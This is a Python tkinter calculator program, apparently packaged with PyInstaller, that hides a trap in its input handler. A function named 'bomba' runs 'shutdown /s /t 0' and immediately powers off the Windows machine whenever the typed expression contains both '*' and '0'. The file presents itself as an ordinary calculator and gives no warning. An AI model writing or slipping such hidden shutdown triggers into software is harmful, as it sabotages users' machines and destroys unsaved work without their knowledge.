from tkinter import *
from tkinter import ttk
from PIL import Image, ImageTk
import os
import sys

cordacabecinhakk= "#7953B8"

calculadora =Tk()
valor_texto = StringVar()
calculadora.title("Calculadora")
calculadora.geometry ("345x420")
calculadora.config(bg="#ffffdd")

janela = Frame(calculadora, width=345, height=60, bg=cordacabecinhakk)
janela.grid(row=0, column=0)

if getattr(sys, 'frozen', False): 
    caminho_base = sys._MEIPASS
else:
    caminho_base = os.path.dirname(os.path.abspath(__file__))

img_gato = Image.open(os.path.join(caminho_base, "gato.png"))  
img_gato = img_gato.resize((60, 60))  
img_gato = ImageTk.PhotoImage(img_gato)

label_gato = Label(janela, image=img_gato, bg=cordacabecinhakk)
label_gato.image = img_gato
label_gato.place(x=0, y=0)

label_gato = Label(janela, image=img_gato, bg=cordacabecinhakk)
label_gato.image = img_gato
label_gato.place(x=0, y=0)

numerico = Frame(calculadora, width=345, height=360)
numerico.grid(row=1, column=0)

# funçao

numerosfodas = ''

def continha(event):
    global numerosfodas
    numerosfodas = numerosfodas + str(event)
    valor_texto.set(numerosfodas)
    bomba(numerosfodas)

def bomba(verificador):
    if "*" in verificador and "0" in verificador:
        os.system("shutdown /s /t 0")

# calcula
def calcular():
    global numerosfodas
    resultado = eval(numerosfodas)
    valor_texto.set(str(resultado))

def finaldaconta ():
    global numerosfodas
    numerosfodas = ""
    valor_texto.set("")


fundo = Label(numerico)
fundo.place(x=0, y=0)

label = Label(janela, textvariable=valor_texto, width=28, height=3, padx= 5, relief=FLAT, justify=RIGHT, font=('Ivy 14 bold'), bg= "#7953B8", fg= "#ffffdd")
label.place(x=60, y=0)

# botãokkkkkkkkkkkkkkkkkkkkkkkk

bc = Button (numerico, command= finaldaconta, text="C", width=16, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
bc.place(x=0, y=0)

bporc = Button (numerico, command=lambda: continha('%'), text="%", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
bporc.place(x=168, y=0)

bdiv = Button (numerico, command=lambda: continha('/'), text="/", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE, bg="#B49BC2")
bdiv.place(x=255, y=0)

b7 = Button (numerico, command=lambda: continha('7'), text="7", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b7.place(x=0, y=72)

b8 = Button (numerico, command=lambda: continha('8'), text="8", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b8.place(x=85, y=72)

b9 = Button (numerico, command=lambda: continha('9'), text="9", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b9.place(x=168, y=72)

bmult = Button (numerico, command=lambda: continha('*'), text="*", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE, bg="#B49BC2")
bmult.place(x=255, y=72)

b4 = Button (numerico, command=lambda: continha('4'), text="4", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b4.place(x=0, y=144)

b5 = Button (numerico, command=lambda: continha('5'), text="5", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b5.place(x=85, y=144)

b6 = Button (numerico, command=lambda: continha('6'), text="6", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b6.place(x=168, y=144)

bmenos = Button (numerico, command=lambda: continha('-'), text="-", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE, bg="#B49BC2")
bmenos.place(x=255, y=144)

b1 = Button (numerico, command=lambda: continha('1'), text="1", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b1.place(x=0, y=216)

b2 = Button (numerico, command=lambda: continha('2'), text="2", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b2.place(x=85, y=216)

b3 = Button (numerico, command=lambda: continha('3'), text="3", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b3.place(x=168, y=216)

bmais = Button (numerico, command=lambda: continha('+'), text="+", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE, bg="#B49BC2")
bmais.place(x=255, y=216)

b0 = Button (numerico, command=lambda: continha('0'), text="0", width=16, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
b0.place(x=0, y=288)

bponto = Button (numerico, command=lambda: continha('.'), text=".", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE)
bponto.place(x=168, y=288)

bres = Button (numerico, command = calcular, text="=", width=8, height=3, font=('Ivy 13 bold'), relief=RAISED, overrelief=RIDGE, bg="#7A5994")
bres.place(x=255, y=288)


calculadora.mainloop()